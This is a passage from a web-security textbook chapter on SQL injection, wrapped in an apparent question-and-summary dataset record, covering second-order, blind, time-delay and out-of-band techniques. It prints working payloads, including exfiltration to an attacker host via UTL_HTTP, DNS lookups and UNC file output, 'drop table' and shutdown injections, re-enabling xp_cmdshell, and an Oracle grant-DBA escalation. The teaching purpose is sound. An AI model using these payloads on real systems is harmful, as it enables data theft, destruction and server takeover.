for the database:\nINSERT INTO users (username, password, ID, privs) VALUES (‘foo’’’,\n‘secret’, 2248, 1)\ncc0099..iinndddd 331133 88//1199//22001111 1122::0099::3311 PPMM",
    "question": "What is the key concept discussed in this section regarding attacking data stores?",
    "summary": "This chapter discusses SQL injection, a common vulnerability in web applications that allows attackers to manipulate database queries. It explains how SQL injection can be used to bypass access controls, extract data, and escalate privileges. The text covers various injection techniques, including injecting into interpreted contexts, SQL statements, and different types of queries like SELECT, INSERT, UPDATE, and DELETE. It also describes how to identify and exploit SQL injection flaws, such as by testing for errors, using the UNION operator to retrieve data, and bypassing filters through techniques like comment injection and string manipulation. The chapter emphasizes the importance of understanding database-specific syntax and provides examples for different databases like Oracle, MS-SQL, and MySQL."
  },
  {
    "start": 250,
    "end": 275,
    "text": "Stuttard c09.indd V3 - 07/28/2011 Page 314\n314 Chapter 9 n Attacking Data Stores\nSo far, so good. However, suppose that the application also implements a\npassword change function. This function is reachable only by authenticated\nusers, but for extra protection, the application requires users to submit their\nold password. It then verifi es that this is correct by retrieving the user’s cur-\nrent password from the database and comparing the two strings. To do this, it\nfi rst retrieves the user’s username from the database and then constructs the\nfollowing query:\nSELECT password FROM users WHERE username = ‘foo’’\nBecause the username stored in the database is the literal string foo’, this\nis the value that the database returns when this value is queried. The doubled-\nup escape sequence is used only at the point where strings are passed into the\ndatabase. Therefore, when the application reuses this string and embeds it into\na second query, a SQL injection fl aw arises, and the user’s original bad input is\nembedded directly into the query. When the user attempts to change the pass-\nword, the application returns the following message, which reveals the fl aw:\nUnclosed quotation mark before the character string ‘foo\nTo exploit this vulnerability, an attacker can simply register a username\ncontaining his crafted input, and then attempt to change his password. For\nexample, if the following username is registered:\n‘ or 1 in (select password from users where username=’admin’)--\nthe registration step itself will be handled securely. When the attacker tries to\nchange his password, his injected query will be executed, resulting in the fol-\nlowing message, which discloses the admin user’s password:\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting\nthe varchar value ‘fme69’ to a column of data type int.\nThe attacker has successfully bypassed the input validation that was designed\nto block SQL injection attacks. Now he has a way to execute arbitrary queries\nwithin the database and retrieve the results.\nTRY IT!\nhttp://mdsec.net/addressbook/107/\nAdvanced Exploitation\nAll the attacks described so far have had a ready means of retrieving any use-\nful data that was extracted from the database, such as by performing a UNION\nattack or returning data in an error message. As awareness of SQL injection\ncc0099..iinndddd 331144 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 315\nChapter 9 n Attacking Data Stores 315\nthreats has evolved, this kind of situation has become gradually less common.\nIt is increasingly the case that the SQL injection fl aws that you encounter will\nbe in situations where retrieving the results of your injected queries is not\nstraightforward. We will look at several ways in which this problem can arise,\nand how you can deal with it.\nNOTE Application owners should be aware that not every attacker is inter-\nested in stealing sensitive data. Some may be more destructive. For example,\nby supplying just 12 characters of input, an attacker could turn off an MS-SQL\ndatabase with the shutdown command:\n‘ shutdown--\nAn attacker could also inject malicious commands to drop individual tables\nwith commands such as these:\n‘ drop table users--\n‘ drop table accounts--\n‘ drop table customers--\nRetrieving Data as Numbers\nIt is fairly common to fi nd that no string fi elds within an application are vulner-\nable to SQL injection, because input containing single quotation marks is being\nhandled properly. However, vulnerabilities may still exist within numeric data\nfi elds, where user input is not encapsulated within single quotes. Often in these\nsituations, the only means of retrieving the results of your injected queries is\nvia a numeric response from the application.\nIn this situation, your challenge is to process the results of your injected\nqueries in such a way that meaningful data can be retrieved in numeric form.\nTwo key functions can be used here:\nn ASCII, which returns the ASCII code for the input character\nn SUBSTRING (or SUBSTR in Oracle), which returns a substring of its input\nThese functions can be used together to extract a single character from a\nstring in numeric form. For example:\nSUBSTRING(‘Admin’,1,1) returns A.\nASCII(‘A’) returns 65.\nTherefore:\nASCII(SUBSTR(‘Admin’,1,1)) returns 65.\nUsing these two functions, you can systematically cut a string of useful data\ninto its individual characters and return each of these separately, in numeric\nform. In a scripted attack, this technique can be used to quickly retrieve and\nreconstruct a large amount of string-based data one byte at a time.\ncc0099..iinndddd 331155 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 316\n316 Chapter 9 n Attacking Data Stores\nTIP There are numerous subtle variations in how different database plat-\nforms handle string manipulation and numeric computation, which you may\nneed to take into account when performing advanced attacks of this kind. An\nexcellent guide to these differences covering many different databases can be\nfound at http://sqlzoo.net/howto/source/z.dir/i08fun.xml.\nIn a variation on this situation, the authors have encountered cases in which\nwhat is returned by the application is not an actual number, but a resource for\nwhich that number is an identifi er. The application performs a SQL query based\non user input, obtains a numeric identifi er for a document, and then returns the\ndocument’s contents to the user. In this situation, an attacker can fi rst obtain\na copy of every document whose identifi ers are within the relevant numeric\nrange and construct a mapping of document contents to identifi ers. Then, when\nperforming the attack described previously, the attacker can consult this map to\ndetermine the identifi er for each document received from the application and\nthereby retrieve the ASCII value of the character he has successfully extracted.\nUsing an Out-of-Band Channel\nIn many cases of SQL injection, the application does not return the results of\nany injected query to the user’s browser, nor does it return any error messages\ngenerated by the database. In this situation, it may appear that your position is\nfutile. Even if a SQL injection fl aw exists, it surely cannot be exploited to extract\narbitrary data or perform any other action. This appearance is false, however.\nYou can try various techniques to retrieve data and verify that other malicious\nactions have been successful.\nThere are many circumstances in which you may be able to inject an arbitrary\nquery but not retrieve its results. Recall the example of the vulnerable login\nform, where the username and password fi elds are vulnerable to SQL injection:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nIn addition to modifying the query’s logic to bypass the login, you can inject\nan entirely separate subquery using string concatenation to join its results to\nthe item you control. For example:\nfoo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE\nusername = ‘DBSNMP’) = ‘DBSNMP’)--\nThis causes the application to perform the following query:\nSELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE\n(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)\ncc0099..iinndddd 331166 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 317\nChapter 9 n Attacking Data Stores 317\nThe database executes your arbitrary subquery, appends its results to foo,\nand then looks up the details of the resulting username. Of course, the login\nwill fail, but your injected query will have been executed. All you will receive\nback in the application’s response is the standard login failure message. What\nyou then need is a way to retrieve the results of your injected query.\nA different situation arises when you can employ batch queries against MS-SQL\ndatabases. Batch queries are extremely useful, because they allow you to execute\nan entirely separate statement over which you have full control, using a different\nSQL verb and targeting a different table. However, because of how batch queries\nare carried out, the results of an injected query cannot be retrieved directly.\nAgain, you need a means of retrieving the lost results of your injected query.\nOne method for retrieving data that is often effective in this situation is to\nuse an out-of-band channel. Having achieved the ability to execute arbitrary\nSQL statements within the database, it is often possible to leverage some of the\ndatabase’s built-in functionality to create a network connection back to your own\ncomputer, over which you can transmit arbitrary data that you have gathered\nfrom the database.\nThe means of creating a suitable network connection are highly database-\ndependent. Different methods may or may not be available given the privilege\nlevel of the database user with which the application is accessing the database.\nSome of the most common and effective techniques for each type of database\nare described here.\n\nMS-SQL\nOn older databases such as MS-SQL 2000 and earlier, the OpenRowSet command\ncan be used to open a connection to an external database and insert arbitrary\ndata into it. For example, the following query causes the target database to open\na connection to the attacker’s database and insert the version string of the target\ndatabase into the table called foo:\ninsert into openrowset(‘SQLOLEDB’,\n‘DRIVER={SQL Server};SERVER=mdattacker.net,80;UID=sa;PWD=letmein’,\n‘select * from foo’) values (@@version)\nNote that you can specify port 80, or any other likely value, to increase your\nchance of making an outbound connection through any fi rewalls.\nOracle\nOracle contains a large amount of default functionality that is accessible by\nlow-privileged users and that can be used to create an out-of-band connection.\nThe UTL_HTTP package can be used to make arbitrary HTTP requests to other\nhosts. UTL_HTTP contains rich functionality and supports proxy servers, cookies,\nredirects, and authentication. This means that an attacker who has compromised\ncc0099..iinndddd 331177 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 318\n318 Chapter 9 n Attacking Data Stores\na database on a highly restricted internal corporate network may be able to\nleverage a corporate proxy to initiate outbound connections to the Internet.\nIn the following example, UTL_HTTP is used to transmit the results of an\ninjected query to a server controlled by the attacker:\n/employees.asp?EmpNo=7521’||UTL_HTTP.request(‘mdattacker.net:80/’||\n(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--\nThis URL causes UTL_HTTP to make a GET request for a URL containing the\nfi rst username in the table all_users. The attacker can simply set up a netcat\nlistener on mdattacker.net to receive the result:\nC:\\>nc -nLp 80\nGET /SYS HTTP/1.1\nHost: mdattacker.net\nConnection: close\nThe UTL_INADDR package is designed to be used to resolve hostnames to IP\naddresses. It can be used to generate arbitrary DNS queries to a server con-\ntrolled by the attacker. In many situations, this is more likely to succeed than\nthe UTL_HTTP attack, because DNS traffi c is often allowed out through corporate\nfi rewalls even when HTTP traffi c is restricted. The attacker can leverage this\npackage to perform a lookup on a hostname of his choice, effectively retrieving\narbitrary data by prepending it as a subdomain to a domain name he controls.\nFor example:\n/employees.asp?EmpNo=7521’||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%\n20FROM%20DBA_USERS%20WHERE%20NAME=’SYS’)||’.mdattacker.net’)\nThis results in a DNS query to the mdattacker.net name server containing\nthe SYS user’s password hash:\nDCB748A5BC5390F2.mdattacker.net\nThe UTL_SMTP package can be used to send e-mails. This facility can be used\nto retrieve large volumes of data captured from the database by sending this\nin outbound e-mails.\nThe UTL_TCP package can be used to open arbitrary TCP sockets to send and\nreceive network data.\nNOTE On Oracle 11g, an additional ACL protects many of the resources just\ndescribed from execution by any arbitrary database user. An easy way around\nthis is to dip into the new functionality provided in Oracle 11g and use this code:\nSYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE\nNAME=’SYS’)||’.mdsec.net’,80)\ncc0099..iinndddd 331188 88//1199//22001111 1122::0099::3311 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 319\nChapter 9 n Attacking Data Stores 319\nMySQL\nThe SELECT ... INTO OUTFILE command can be used to direct the output from\nan arbitrary query into a fi le. The specifi ed fi lename may contain a UNC path,\nenabling you to direct the output to a fi le on your own computer. For example:\nselect * into outfile ‘\\\\\\\\mdattacker.net\\\\share\\\\output.txt’ from users;\nTo receive the fi le, you need to create an SMB share on your computer that\nallows anonymous write access. You can confi gure shares on both Windows\nand UNIX-based platforms to behave in this way. If you have diffi culty receiv-\ning the exported fi le, this may result from a confi guration issue in your SMB\nserver. You can use a sniffer to confi rm whether the target server is initiating\nany inbound connections to your computer. If it is, consult your server docu-\nmentation to ensure that it is confi gured correctly.\nLeveraging the Operating System\nIt is often possible to perform escalation attacks via the database that result in\nexecution of arbitrary commands on the operating system of the database server\nitself. In this situation, many more avenues are available to you for retrieving\ndata, such as using built-in commands like tftp,mail, and telnet, or copying\ndata into the web root for retrieval using a browser. See the later section “Beyond\nSQL Injection” for techniques for escalating privileges on the database itself.\nUsing Inference: Conditional Responses\nThere are many reasons why an out-of-band channel may be unavailable. Most\ncommonly this occurs because the database is located within a protected net-\nwork whose perimeter fi rewalls do not allow any outbound connections to the\nInternet or any other network. In this situation, you are restricted to accessing\nthe database entirely via your injection point into the web application.\nIn this situation, working more or less blind, you can use many techniques\nto retrieve arbitrary data from within the database. These techniques are all\nbased on the concept of using an injected query to conditionally trigger some\ndetectable behavior by the database and then inferring a required item of infor-\nmation on the basis of whether this behavior occurs.\nRecall the vulnerable login function where the username and password fi elds\ncan be injected into to perform arbitrary queries:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nSuppose that you have not identifi ed any method of transmitting the results\nof your injected queries back to the browser. Nevertheless, you have already\nseen how you can use SQL injection to modify the application’s behavior.\ncc0099..iinndddd 331199 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 320\n320 Chapter 9 n Attacking Data Stores\nFor example, submitting the following two pieces of input causes very differ-\nent results:\nadmin’ AND 1=1--\nadmin’ AND 1=2--\nIn the fi rst case, the application logs you in as the admin user. In the second\ncase, the login attempt fails, because the 1=2 condition is always false. You\ncan leverage this control of the application’s behavior as a means of inferring\nthe truth or falsehood of arbitrary conditions within the database itself. For\nexample, using the ASCII and SUBSTRING functions described previously, you\ncan test whether a specifi c character of a captured string has a specifi c value. For\nexample, submitting this piece of input logs you in as the admin user, because\nthe condition tested is true:\nadmin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 65--\nSubmitting the following input, however, results in a failed login, because\nthe condition tested is false:\nadmin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 66--\nBy submitting a large number of such queries, cycling through the range\nof likely ASCII codes for each character until a hit occurs, you can extract the\nentire string, one byte at a time.\nInducing Conditional Errors\nIn the preceding example, the application contained some prominent function-\nality whose logic could be directly controlled by injecting into an existing SQL\nquery. The application’s designed behavior (a successful versus a failed login)\ncould be hijacked to return a single item of information to the attacker. However,\nnot all situations are this straightforward. In some cases, you may be injecting\ninto a query that has no noticeable effect on the application’s behavior, such\nas a logging mechanism. In other cases, you may be injecting a subquery or a\nbatched query whose results are not processed by the application in any way.\nIn this situation, you may struggle to fi nd a way to cause a detectable difference\nin behavior that is contingent on a specifi ed condition.\nDavid Litchfi eld devised a technique that can be used to trigger a detect-\nable difference in behavior in most circumstances. The core idea is to inject\na query that induces a database error contingent on some specifi ed condi-\ntion. When a database error occurs, it is often externally detectable, either\nthrough an HTTP 500 response code or through some kind of error message\nor anomalous behavior (even if the error message itself does not disclose any\nuseful information).\ncc0099..iinndddd 332200 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 321\nChapter 9 n Attacking Data Stores 321\nThe technique relies on a feature of database behavior when evaluating con-\nditional statements: the database evaluates only those parts of the statement\nthat need to be evaluated given the status of other parts. An example of this\nbehavior is a SELECT statement containing a WHERE clause:\n\nSELECT X FROM Y WHERE C\nThis causes the database to work through each row of table Y, evaluating\ncondition C, and returning X in those cases where condition C is true. If condi-\ntion C is never true, the expression X is never evaluated.\nThis behavior can be exploited by fi nding an expression X that is syntactically\nvalid but that generates an error if it is ever evaluated. An example of such an\nexpression in Oracle and MS-SQL is a divide-by-zero computation, such as 1/0.\nIf condition C is ever true, expression X is evaluated, causing a database error.\nIf condition C is always false, no error is generated. You can, therefore, use the\npresence or absence of an error to test an arbitrary condition C.\nAn example of this is the following query, which tests whether the default\nOracle user DBSNMP exists. If this user exists, the expression 1/0 is evaluated,\ncausing an error:\nSELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =\n‘DBSNMP’) = ‘DBSNMP’\nThe following query tests whether an invented user AAAAAA exists. Because\nthe WHERE condition is never true, the expression 1/0 is not evaluated, so no\nerror occurs:\nSELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username =\n‘AAAAAA’) = ‘AAAAAA’\nWhat this technique achieves is a way of inducing a conditional response\nwithin the application, even in cases where the query you are injecting has no\nimpact on the application’s logic or data processing. It therefore enables you\nto use the inference techniques described previously to extract data in a wide\nrange of situations. Furthermore, because of the technique’s simplicity, the same\nattack strings will work on a range of databases, and where the injection point\nis into various types of SQL statements.\nThis technique is also versatile because it can be used in all kinds of injection\npoints where a subquery can be injected. For example:\n(select 1 where <<condition>> or 1/0=0)\nConsider an application that provides a searchable and sortable contacts\ndatabase. The user controls the parameters department and sort:\n/search.jsp?department=30&sort=ename\ncc0099..iinndddd 332211 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 322\n322 Chapter 9 n Attacking Data Stores\nThis appears in the following back-end query, which parameterizes the depart-\nment parameter but concatenates the sort parameter onto the query:\nString queryText = “SELECT ename,job,deptno,hiredate FROM emp WHERE deptno = ?\nORDER BY “ + request.getParameter(“sort”) + “ DESC”;\nIt is not possible to alter the WHERE clause, or issue a UNION query after an ORDER\nBY clause; however, an attacker can create an inference condition by issuing the\nfollowing statement:\n/search.jsp?department=20&sort=(select%201/0%20from%20dual%20where%20\n(select%20substr(max(object_name),1,1)%20FROM%20user_objects)=’Y’)\nIf the fi rst letter of the fi rst object name in the user_objects table is equal\nto ‘Y’, this will cause the database to attempt to evaluate 1/0. This will result\nin an error, and no results will be returned by the overall query. If the letter\nis not equal to ‘Y’, results from the original query will be returned in the\ndefault order. Carefully supplying this condition to an SQL injection tool\nsuch as Absinthe or SQLMap, we can retrieve every record in the database.\nUsing Time Delays\nDespite all the sophisticated techniques already described, there may yet be\nsituations in which none of these tricks are effective. In some cases, you may\nbe able to inject a query that returns no results to the browser, cannot be used\nto open an out-of-band channel, and that has no effect on the application’s\nbehavior, even if it induces an error within the database itself.\nIn this situation, all is not lost, thanks to a technique invented by Chris Anley\nand Sherief Hammad of NGSSoftware. They devised a way of crafting a query\nthat would cause a time delay, contingent on some condition specifi ed by the\nattacker. The attacker can submit his query and then monitor the time taken for\nthe server to respond. If a delay occurs, the attacker may infer that the condi-\ntion is true. Even if the actual content of the application’s response is identical\nin the two cases, the presence or absence of a time delay enables the attacker to\nextract a single bit of information from the database. By performing numerous\nsuch queries, the attacker can systematically retrieve arbitrarily complex data\nfrom the database one bit at a time.\nThe precise means of inducing a suitable time delay depends on the target\ndatabase being used. MS-SQL contains a built-in WAITFOR command, which can\nbe used to cause a specifi ed time delay. For example, the following query causes\na time delay of 5 seconds if the current database user is sa:\nif (select user) = ‘sa’ waitfor delay ‘0:0:5’\ncc0099..iinndddd 332222 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 323\nChapter 9 n Attacking Data Stores 323\nEquipped with this command, the attacker can retrieve arbitrary informa-\ntion in various ways. One method is to leverage the same technique already\ndescribed for the case where the application returns conditional responses.\nNow, instead of triggering a different application response when a particular\ncondition is detected, the injected query induces a time delay. For example, the\nsecond of these queries causes a time delay, indicating that the fi rst letter of the\ncaptured string is A:\nif ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’\nif ASCII(SUBSTRING(‘Admin’,1,1)) = 65 waitfor delay ‘0:0:5’\nAs before, the attacker can cycle through all possible values for each character\nuntil a time delay occurs. Alternatively, the attack could be made more effi cient\nby reducing the number of requests needed. An additional technique is to break\neach byte of data into individual bits and retrieve each bit in a single query. The\nPOWER command and the bitwise AND operator & can be used to specify condi-\ntions on a bit-by-bit basis. For example, the following query tests the fi rst bit of\nthe fi rst byte of the captured data and pauses if it is 1:\nif (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,0))) > 0 waitfor delay ‘0:0:5’\nThe following query performs the same test on the second bit:\nif (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,1))) > 0 waitfor delay ‘0:0:5’\nAs mentioned earlier, the means of inducing a time delay are highly database-\ndependent. In current versions of MySQL, the sleep function can be used to\ncreate a time delay for a specifi ed number of milliseconds:\nselect if(user() like ‘root@%’, sleep(5000), ‘false’)\nIn versions of MySQL prior to 5.0.12, the sleep function cannot be used. An\nalternative is the benchmark function, which can be used to perform a specifi ed\naction repeatedly. Instructing the database to perform a processor-intensive\naction, such as a SHA-1 hash, many times will result in a measurable time\ndelay. For example:\nselect if(user() like ‘root@%’, benchmark(50000,sha1(‘test’)), ‘false’)\nIn PostgreSQL, the PG_SLEEP function can be used in the same way as the\nMySQL sleep function.\nOracle has no built-in method to perform a time delay, but you can use\nother tricks to cause a time delay to occur. One trick is to use UTL_HTTP to\ncc0099..iinndddd 332233 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 324\n324 Chapter 9 n Attacking Data Stores\nconnect to a nonexistent server, causing a timeout. This causes the database\nto attempt to connect to the specifi ed server and eventually time out. For\nexample:\nSELECT ‘a’||Utl_Http.request(‘http://madeupserver.com’) from dual\n...delay...\nORA-29273: HTTP request failed\nORA-06512: at “SYS.UTL_HTTP”, line 1556\nORA-12545: Connect failed because target host or object does not exist\nYou can leverage this behavior to cause a time delay contingent on some\ncondition that you specify. For example, the following query causes a timeout\nif the default Oracle account DBSNMP exists:\nSELECT ‘a’||Utl_Http.request(‘http://madeupserver.com’) FROM dual WHERE\n(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’\nIn both Oracle and MySQL databases, you can use the SUBSTR(ING)and ASCII\nfunctions to retrieve arbitrary information one byte at a time, as described\npreviously.\nTIP We have described the use of time delays as a means of extracting\ninteresting information. However, the time-delay technique can also be\nimmensely useful when performing initial probing of an application to\ndetect SQL injection vulnerabilities. In some cases of completely blind\nSQL injection, where no results are returned to the browser and all errors\nare handled invisibly, the vulnerability itself may be hard to detect using\nstandard techniques based on supplying crafted input. In this situation,\nusing time delays is often the most reliable way to detect the presence of a\nvulnerability during initial probing. For example, if the back-end database\nis MS-SQL, you can inject each of the following strings into each request\nparameter in turn and monitor how long the application takes to identify\nany vulnerabilities:\n‘; waitfor delay ‘0:30:0’--\n1; waitfor delay ‘0:30:0’--\nTRY IT!\nThis lab example contains a SQL injection vulnerability with no error feed-\nback. You can use it to practice various advanced techniques, including the\nuse of conditional responses and time delays.\nhttp://mdsec.net/addressbook/44/\ncc0099..iinndddd 332244 88//1199//22001111 1122::0099::3322 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 325\nChapter 9 n Attacking Data Stores 325\nBeyond SQL Injection: Escalating the Database Attack\nA successful exploit of a SQL injection vulnerability often results in total com-\npromise of all application data. Most applications employ a single account for\nall database access and rely on application-layer controls to enforce segregation\nof access between different users. Gaining unrestricted use of the application’s\ndatabase account results in access to all its data.\nYou may suppose, therefore, that owning all the application’s data is the\nfi nishing point of a SQL injection attack. However, there are many reasons\nwhy it might be productive to advance your attack further, either by exploiting\na vulnerability within the database itself or by harnessing some of its built-in\nfunctionality to achieve your objectives. Further attacks that can be performed\nby escalating the database attack include the following:\nn If the database is shared with other applications, you may be able to escalate\nprivileges within the database and gain access to other applications’ data.\nn You may be able to compromise the operating system of the database server.\nn You may be able to gain network access to other systems. Typically, the\ndatabase server is hosted on a protected network behind several layers\nof network perimeter defenses. From the database server, you may be in\na trusted position and be able to reach key services on other hosts, which\nmay be further exploitable.\nn You may be able to make network connections back out of the hosting\ninfrastructure to your own computer. This may enable you to bypass the\napplication, easily transmitting large amounts of sensitive data gathered\nfrom the database, and often evading many intrusion detection systems.\nn You may be able to extend the database’s existing functionality in arbitrary\nways by creating user-defi ned functions. In some situations, this may enable\nyou to circumvent hardening that has been performed on the database by\neffectively reimplementing functionality that has been removed or disabled.\nThere is a method for doing this in each of the mainstream databases,\nprovided that you have gained database administrator (DBA) privileges.\n\nCOMMON MYTH\nMany database administrators assume that it is unnecessary to defend the data-\nbase against attacks that require authentication to exploit. They may reason\nthat the database is accessed by only a trusted application that is owned by the\nsame organization. This ignores the possibility that a fl aw within the applica-\ntion may enable a malicious third party to interact with the database within the\napplication’s security context. Each of the possible attacks just described should\nillustrate why databases need to be defended against authenticated attackers.\ncc0099..iinndddd 332255 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 326\n326 Chapter 9 n Attacking Data Stores\nAttacking databases is a huge topic that is beyond the scope of this book. This\nsection points you toward a few key ways in which vulnerabilities and function-\nality within the main database types can be leveraged to escalate your attack.\nThe key conclusion to draw is that every database contains ways to escalate\nprivileges. Applying current security patches and robust hardening can help\nmitigate many of these attacks, but not all of them. For further reading on this\nhighly fruitful area of current research, we recommend TheDatabaseHacker’s\nHandbook (Wiley, 2005).\n\nMS-SQL\nPerhaps the most notorious piece of database functionality that an attacker can\nmisuse is the xp_cmdshell stored procedure, which is built into MS-SQL by\ndefault. This stored procedure allows users with DBA permissions to execute\noperating system commands in the same way as the cmd.exe command prompt.\nFor example:\nmaster..xp_cmdshell ‘ipconfig > foo.txt’\nThe opportunity for an attacker to misuse this functionality is huge. He can\nperform arbitrary commands, pipe the results to local fi les, and read them back.\nHe can open out-of-band network connections back to himself and create a\nbackdoor command and communications channel, copying data from the server\nand uploading attack tools. Because MS-SQL runs by default as LocalSystem,\nthe attacker typically can fully compromise the underlying operating system,\nperforming arbitrary actions. MS-SQL contains a wealth of other extended\nstored procedures, such as xp_regread and xp_regwrite, that can be used to\nperform powerful actions within the registry of the Windows operating system.\nDealing with Default Lockdown\nMost installations of MS-SQL encountered on the Internet will be MS-SQL 2005\nor later. These versions contain numerous security features that lock down the\ndatabase by default, preventing many useful attack techniques from working.\nHowever, if the web application’s user account within the database is suf-\nfi ciently high-privileged, it is possible to overcome these obstacles simply by\nreconfi guring the database. For example, if xp_cmdshell is disabled, it can be\nre-enabled with the sp_configure stored procedure. The following four lines\nof SQL do this:\nEXECUTE sp_configure ‘show advanced options’, 1\n\nRECONFIGURE WITH OVERRIDE\nEXECUTE sp_configure ‘xp_cmdshell’, ‘1’\n\nRECONFIGURE WITH OVERRIDE\ncc0099..iinndddd 332266 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 327\nChapter 9 n Attacking Data Stores 327\nAt this point, xp_cmdshell is re-enabled and can be run with the usual\ncommand:\nexec xp_cmdshell ‘dir’\nOracle\nA huge number of security vulnerabilities have been found within the Oracle\ndatabase software itself. If you have found a SQL injection vulnerability that\nenables you to perform arbitrary queries, typically you can escalate to DBA\nprivileges by exploiting one of these vulnerabilities.\nOracle contains many built-in stored procedures that execute with DBA privi-\nleges and have been found to contain SQL injection fl aws within the procedures\nthemselves. A typical example of such a fl aw existed in the default package\nSYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES prior to the July 2006\ncritical patch update. This can be exploited to escalate privileges by injecting\nthe query grant DBA to public into the vulnerable fi eld:\nselect SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘INDX’,’SCH’,\n‘TEXTINDEXMETHODS”.ODCIIndexUtilCleanup(:p1); execute immediate\n‘’declare pragma autonomous_transaction; begin execute immediate\n‘’’’grant dba to public’’’’ ; end;’’; END;--’,’CTXSYS’,1,’1’,0) from dual\nThis type of attack could be delivered via a SQL injection fl aw in a web appli-\ncation by injecting the function into the vulnerable parameter.\nIn addition to actual vulnerabilities like these, Oracle also contains a large\namount of default functionality. It is accessible by low-privileged users and\ncan be used to perform undesirable actions, such as initiating network connec-\ntions or accessing the fi lesystem. In addition to the powerful packages already\ndescribed for creating out-of-band connections, the package UTL_FILE can be\nused to read from and write to fi les on the database server fi lesystem.\nIn 2010, David Litchfi eld demonstrated how Java can be abused in Oracle 10g\nR2 and 11g to execute operating system commands. This attack fi rst exploits a\nfl aw in DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY to grant the current user the\npermission java.io.filepermission. The attack then executes a Java class\n(oracle/aurora/util/Wrapper) that runs an OS command, using DBMS_JAVA.\nRUNJAVA. For example:\nDBMS_JAVA.RUNJAVA(‘oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\\ncmd.exe /c dir>c:\\\\OUT.LST’)\nMore details can be found here:\nn www.databasesecurity.com/HackingAurora.pdf\nn www.notsosecure.com/folder2/2010/08/02/blackhat-2010/\ncc0099..iinndddd 332277 88//1199//22001111 1122::0099::3322 PPMM\n\nStuttard c09.indd V3 - 07/28/2011 Page 328\n328 Chapter 9 n Attacking Data Stores\nMySQL\nCompared to the other databases covered, MySQL contains relatively little\nbuilt-in functionality that an attacker can misuse. One example is the ability\nof any user with the FILE_PRIV permission to read and write to the fi lesystem.\nThe LOAD_FILE command can be used to retrieve the contents of any fi le. For\nexample:\nselect load_file(‘/etc/passwd’)\nThe SELECT ... INTO OUTFILE command can be used to pipe the results of\nany query into a fi le. For example:\ncreate table test (a varchar(200))\ninsert into test(a) values (‘+ +’)\nselect * from test into outfile ‘/etc/hosts.equiv’\nIn addition to reading and writing key operating system fi les, this capability\ncan be used to perform other attacks:\nn Because MySQL stores its data in plaintext fi les, to which the database\nmust have read access, an attacker with FILE_PRIV permissions can simply\nopen the relevant fi le and read arbitrary data from within the database,\nbypassing any access controls enforced within the database itself.\nn MySQL enables users to create user-defi ned functions (UDFs) by calling\nout to a compiled library fi le that contains the function’s implementation.\nThis fi le must be located within the normal path from which MySQL loads\ndynamic libraries. An attacker can use the preceding method to create\nan arbitrary binary fi le within this path and then create a UDF that uses\nit. Refer to Chris Anley’s paper “Hackproofi ng MySQL” for more details\non this technique.\nUsing SQL Exploitation Tools\nMany of the techniques we have described for exploiting SQL injection vulner-\nabilities involve performing large numbers of requests to extract small amounts\nof data at a time. Fortunately, numerous tools are available that automate much\nof this process and that are aware of the database-specifi c syntax required to\ndeliver successful attacks.\nMost of the currently available tools use the following approach to exploit\nSQL injection vulnerabilities:\nn Brute-force all parameters in the target request to locate SQL injection\npoints.\ncc0099..iinndddd 332288 88//1199//22001111 1122::0099::3322 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 329\nChapter 9 n Attacking Data Stores 329\nn Determine the location of the vulnerable fi eld within the back-end SQL\nquery by appending various characters such as closing brackets, comment\ncharacters, and SQL keywords.\nn Attempt to perform a UNION attack by brute-forcing the number of required\ncolumns and then identifying a column with the varchar data type, which\ncan be used to return results.\nn Inject custom queries to retrieve arbitrary data — if necessary, concate-\nnating data from multiple columns into a string that can be retrieved\nthrough a single result of the varchar data type.\nn If results cannot be retrieved using UNION, inject Boolean conditions (AND\n1=1,AND 1=2, and so on) into the query to determine whether conditional\nresponses can be used to retrieve data.\nn If results cannot be retrieved by injecting conditional expressions, try\nusing conditional time delays to retrieve data.\nThese tools locate data by querying the relevant metadata tables for the data-\nbase in question. Generally they can perform some level of escalation, such as\nusing xp_cmdshell to gain OS-level access. They also use various optimization\ntechniques, making use of the many features and built-in functions in the various\ndatabases 